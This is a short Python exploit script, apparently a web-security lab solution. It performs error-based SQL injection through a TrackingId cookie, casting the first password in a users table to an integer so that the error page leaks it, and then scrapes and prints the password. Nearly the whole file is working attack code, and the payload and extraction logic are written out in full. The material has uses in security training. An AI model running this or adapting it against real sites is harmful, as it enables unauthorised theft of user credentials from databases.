import sys
import urllib
import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080'}


def exploit_payload(url):
    payload = "' and cast((select password from users limit 1) as int )=1--"
    endcoded_payload = urllib.parse.quote_plus(payload)
    cookies = {'TrackingId': ''+endcoded_payload,
               'session': 'KhPmQpHAZ8BEWDSuHF0f5aX1J7NV8W0H'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 500:
        soup = BeautifulSoup(r.text, 'html.parser')
        password = soup.find_all('h4')[-1].text.split(' ')[-1]

        return password
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f'[*] Usage: python {sys.argv[0]} <url>')
        print(f'[*] Example: python {sys.argv[0]} http://www.example.com')
    password = exploit_payload(url)
    if password:
        print(f'\n[+] Exploit Successful! {password}')
    else:
        print('\n[-] Exploit Failed!')
